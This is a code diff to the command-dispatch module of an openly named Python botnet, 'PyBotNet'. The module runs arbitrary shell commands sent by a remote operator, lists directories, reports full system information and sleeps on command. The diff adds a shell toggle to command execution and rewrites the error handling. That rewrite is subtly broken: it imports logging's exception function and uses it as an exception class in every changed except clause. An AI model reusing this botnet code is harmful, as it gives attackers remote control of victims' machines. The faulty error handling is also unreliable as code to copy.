@@ -1,5 +1,6 @@
 '''Defult PyBotNet scripts'''
 
+from logging import exception
 from time import sleep
 from subprocess import check_output
 from os import listdir
@@ -36,7 +37,7 @@ def is_command(command) -> bool:
     return False
 
 
-def execute_scripts(command, pybotnet_up_time, logger):
+def execute_scripts(command: str, pybotnet_up_time, is_shell: bool, logger):
     command_name = get_command_name(command)
     try:
         if is_command(command):
@@ -54,7 +55,7 @@ def execute_scripts(command, pybotnet_up_time, logger):
                 return get_info(pybotnet_up_time, logger)
 
             elif command_name == 'cmd':
-                return execute_cmd(command, logger)
+                return execute_cmd(command, is_shell, logger)
 
             elif command_name == 'ls':
                 return execute_ls(command, logger)
@@ -62,8 +63,8 @@ def execute_scripts(command, pybotnet_up_time, logger):
         logger.error('invalid command; Wrong format')
         return 'invalid command; Wrong format'
 
-    except:
-        return 'execute_scripts error'
+    except exception as error:
+        return f'execute_scripts error: {error}'
 
 
 def execute_do_sleep(command, logger):
@@ -82,9 +83,10 @@ def execute_do_sleep(command, logger):
     except OverflowError as error_name:
         logger.error(f'do_sleep {error_name}')
 
-    except:
-        logger.error('execute_do_sleep invalid command; Wrong format')
-        return 'execute_do_sleep invalid command; Wrong format'
+    except exception as error:
+        logger.error(
+            f'execute_do_sleep invalid command; Wrong format, error: {error}')
+        return f'execute_do_sleep invalid command; Wrong format, error: {error}'
 
 
 def do_sleep(seconds, logger, sleep_message: str):
@@ -104,29 +106,30 @@ def get_info(pybotnet_up_time, logger):
     return util.get_full_system_info(pybotnet_up_time)
 
 
-def execute_cmd(command, logger) -> str:
+def execute_cmd(command, is_shell: bool, logger) -> str:
     try:
         command = split_command(command)
         command = ' '.join(command[1:])
 
-    except:
-        return 'execute_cmd invalid command; Wrong format'
+    except exception as error:
+        return f'execute_cmd invalid command; Wrong format: {error}'
 
     try:
-        return cmd(command, logger=logger)
-    except OverflowError as error_name:
-        return f'cmd {error_name}'
-    except:
-        return 'cmd error'
+        return cmd(command, is_shell, logger=logger)
+
+    except OverflowError as error:
+        return f'cmd {error}'
+    except exception as error:
+        return f'cmd error: {error}'
 
 
-def cmd(command: str,  logger) -> str:
+def cmd(command: str, is_shell: bool,  logger) -> str:
     '''command sample: makedir newfolder'''
     # TODO: add timeout
 
     logger.info(f'try to run: {command}')
 
-    output = check_output(command, shell=True)
+    output = check_output(command, shell=is_shell)
 
     output = str(output).replace('\\r\\n', '\n')  # cleaning data
     output = str(output).replace('\\n', '\n')
@@ -141,8 +144,8 @@ def execute_ls(command, logger) -> str:
 
     try:
         return ls(command[1])
-    except:
-        return 'execute_ls error '
+    except exception as error:
+        return f'execute_ls error: {error} '
 
 
 def ls(route: str) -> str:
@@ -151,5 +154,5 @@ def ls(route: str) -> str:
 
     except FileNotFoundError as error:
         return f'ls {error}'
-    except:
-        return 'ls Unknown error'
+    except exception as error:
+        return f'ls Unknown error: {error}'
